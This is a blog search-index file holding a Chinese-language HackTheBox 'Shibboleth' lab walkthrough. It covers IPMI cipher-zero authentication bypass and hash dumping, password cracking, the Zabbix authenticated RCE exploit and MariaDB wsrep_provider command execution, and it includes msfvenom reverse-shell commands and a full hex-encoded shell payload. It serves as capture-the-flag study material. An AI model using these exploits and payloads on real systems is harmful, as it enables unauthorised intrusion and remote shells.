<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HTB-Shibboleth</title>
    <link href="/2022/11/30/HTB-Shibboleth/"/>
    <url>/2022/11/30/HTB-Shibboleth/</url>
    
    <content type="html"><![CDATA[<h1 id="Shibboleth"><a href="#Shibboleth" class="headerlink" title="Shibboleth"></a>Shibboleth</h1><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PORT</span>   STATE SERVICE REASON         VERSION<br><span class="hljs-attribute">80</span>/tcp open  http    syn-ack ttl <span class="hljs-number">63</span> Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">41</span><br><span class="hljs-attribute">Service</span> Info: Host: shibboleth.htb<br></code></pre></td></tr></table></figure><h2 id="列舉"><a href="#列舉" class="headerlink" title="列舉"></a>列舉</h2><ul><li><p>subdomain</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wfuzz -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/DNS/</span>subdomains-top1million-<span class="hljs-number">110000</span>.txt -u Shibboleth.htb  -H <span class="hljs-string">&#x27;host:FUZZ.Shibboleth.htb&#x27;</span> --hw <span class="hljs-number">26</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/V9x98P5.png"></p></li><li><p>UDP</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">nmap -Pn -n -sU -<span class="hljs-selector-tag">p</span>- <span class="hljs-attr">--min-rate</span> <span class="hljs-number">2000</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.124</span> <span class="hljs-attr">--open</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/dw3CX6b.png"></p></li><li><p>IPMI</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfconsole<br><br>scanner<span class="hljs-regexp">/ipmi/i</span>pmi_version<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/3ZrThKw.png"></p></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">在ipmi <span class="hljs-number">2.0</span> 有漏洞存在 密碼類行為<span class="hljs-number">0</span> 可在使用者名稱存在的情況下繞過密碼訪問<br><br>auxiliary<span class="hljs-regexp">/scanner/i</span>pmi/ipmi_cipher_zero<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/7pMfZqC.png"></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ipmitool</span> -I lanplus -C <span class="hljs-number">0</span> -H <span class="hljs-number">10.10.11.124</span> -U <span class="hljs-string">&#x27;Administrator&#x27;</span> -P <span class="hljs-string">&#x27;123123&#x27;</span> user list<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/l3vM9I3.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">msf 的hashdump撈出hash<br><br>scanner<span class="hljs-regexp">/ipmi/i</span>pmi_dumphashes<br><br>Administrator:b16b065082040000da227631f53903b97f689ad6fc911214d483e5be6bec934d5e7b31dde781a5b4a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:<span class="hljs-number">065</span>dbfeb348ccce0b7ac7337e764c00c7e083192<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/mIYgLXR.png"></p><ul><li><p>hashcat crack IPMI2 RAKP HMAC-SHA1</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">hashcat -m <span class="hljs-number">7300</span> -a <span class="hljs-number">0</span> hash <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt<br><br>ilovepumkinpie1<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/DqcVoTv.png"></p></li><li><p>登入zabbix</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">利用剛剛獲得的憑證<span class="hljs-title class_">Administrator</span><span class="hljs-symbol">:ilovepumkinpie1</span><br>登入zabbix<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/SKSmhR7.png"></p></li></ul><h2 id="外殼"><a href="#外殼" class="headerlink" title="外殼"></a>外殼</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Zabbix</span> <span class="hljs-number">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">17</span> - Remote Code Execution (RCE) (Authenticated)<br><br><span class="hljs-attribute">python3</span> <span class="hljs-number">50816</span>.py http://zabbix.shibboleth.htb/ &#x27;Administrator&#x27; &#x27;ilovepumkinpie1&#x27; <span class="hljs-number">10.10.14.6</span> <span class="hljs-number">443</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/9Snu5a5.png"></p><ul><li>reverse shell<br><img src="https://i.imgur.com/ozyEmgH.png"></li></ul><h2 id="提權"><a href="#提權" class="headerlink" title="提權"></a>提權</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">利用同一組密碼切換使用者到ipmi-svc<br><br><span class="hljs-regexp">/etc/</span>zabbix 為zabbix設定檔 找尋有無mysql帳密<br><br>grep <span class="hljs-string">&quot;db&quot;</span> -nir .<br><br><span class="hljs-comment"># zabbix:bloooarskybluh</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/EARanPO.png"></p><ul><li>漏洞利用<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">查看mariadb 版本<br>select @@version;<br><span class="hljs-number">10.3</span>.<span class="hljs-number">25</span>-MariaDB-<span class="hljs-number">0</span>ubuntu0.<span class="hljs-number">20.04</span>.<span class="hljs-number">1</span> <br><br>MariaDB <span class="hljs-number">10.2</span> /MySQL - <span class="hljs-string">&#x27;wsrep_provider&#x27;</span> OS Command Execution<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Al1ex/</span>CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">27928</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/shell_reverse_tcp <span class="hljs-attribute">lhost</span>=10.10.14.6 <span class="hljs-attribute">lport</span>=443 -f elf-so &gt; journalctl.so<br></code></pre></td></tr></table></figure><img src="https://i.imgur.com/YrpNY3i.png"></li></ul><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cos">python3 -c &#x27;<span class="hljs-keyword">print</span>(<span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;journalctl.so&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).<span class="hljs-keyword">read</span>().hex())&#x27;<br>&lt;-c &#x27;<span class="hljs-keyword">print</span>(<span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;journalctl.so&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).<span class="hljs-keyword">read</span>().hex())&#x27;<br><br><span class="hljs-number">7</span>f454c4602010100000000000000000003003e000100000092010000000000004000000000000000b000000000000000000000004000380002004000020001000100000007000000000000000000000000000000000000000000000000000000dc0100000000000026020000000000000010000000000000020000000700000030010000000000003001000000000000300100000000000060000000000000006000000000000000001000000000000001000000060000000000000000000000300100000000000030010000000000006000000000000000000000000000000008000000000000000700000000000000000000000300000000000000000000009001000000000000900100000000000002000000000000000000000000000000000000000000000000000000000000000c00000000000000920100000000000005000000000000009001000000000000060000000000000090010000000000000a0000000000000000000000000000000b0000000000000000000000000000000000000000000000000000000000000000006a2958996a025f6a015e0f05489748b9020001bb0a0a0e06514889e66a105a6a2a580f056a035e48ffce6a21580f0575f66a3b589948bb2f62696e2f736800534889e752574889e60f05<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/uCfXjo3.png"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">直接傳輸或是直接寫入<br><br>select unhex(&#x27;7f454c<span class="hljs-number">46020101000000</span><span class="hljs-number">00000000000003</span>003e<span class="hljs-number">00010000009201</span><span class="hljs-number">00000000000040</span><span class="hljs-number">00000000000000</span>b<span class="hljs-number">00000000000000</span><span class="hljs-number">00000000040003</span><span class="hljs-number">80002004000020</span><span class="hljs-number">00100010000000</span><span class="hljs-number">70000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">000000000000</span>0dc<span class="hljs-number">01000000000000</span><span class="hljs-number">26020000000000</span><span class="hljs-number">00001000000000</span><span class="hljs-number">00000200000007</span><span class="hljs-number">00000030010000</span><span class="hljs-number">00000000300100</span><span class="hljs-number">00000000003001</span><span class="hljs-number">00000000000060</span><span class="hljs-number">00000000000000</span><span class="hljs-number">60000000000000</span><span class="hljs-number">00001000000000</span><span class="hljs-number">00000100000006</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000300100</span><span class="hljs-number">00000000003001</span><span class="hljs-number">00000000000060</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00080000000000</span><span class="hljs-number">00000700000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">03000000000000</span><span class="hljs-number">00000000009001</span><span class="hljs-number">00000000000090</span><span class="hljs-number">01000000000000</span><span class="hljs-number">02000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000</span>0c<span class="hljs-number">00000000000000</span><span class="hljs-number">92010000000000</span><span class="hljs-number">00050000000000</span><span class="hljs-number">00009001000000</span><span class="hljs-number">00000006000000</span><span class="hljs-number">00000000900100</span><span class="hljs-number">0000000000</span>0a<span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span>000b<span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">0000000000</span>6a<span class="hljs-number">295899</span>6a025f6a015e0f<span class="hljs-number">05489748</span>b<span class="hljs-number">902000</span>1bb0a0a0e<span class="hljs-number">06514889</span>e66a105a6a2a580f056a035e48ffce6a<span class="hljs-number">2158</span>0f<span class="hljs-number">0575</span>f66a3b<span class="hljs-number">589948</span>bb2f<span class="hljs-number">6269</span>6e2f<span class="hljs-number">736800534889</span>e<span class="hljs-number">75257488</span>9e60f05&#x27;) into dumpfile &#x27;/tmp/journalctl.so&#x27;;<br>&lt;<span class="hljs-number">34889</span>e752574889e60f05&#x27;)<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> global <span class="hljs-attribute">wsrep_provider</span>=<span class="hljs-string">&quot;/tmp/journalctl.so&quot;</span>;<br>nc -lvnp 443<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/O2YQh6U.png"></p>]]></content>
    
    
    <categories>
      
      <category>HTB</category>
      
      <category>靶機</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
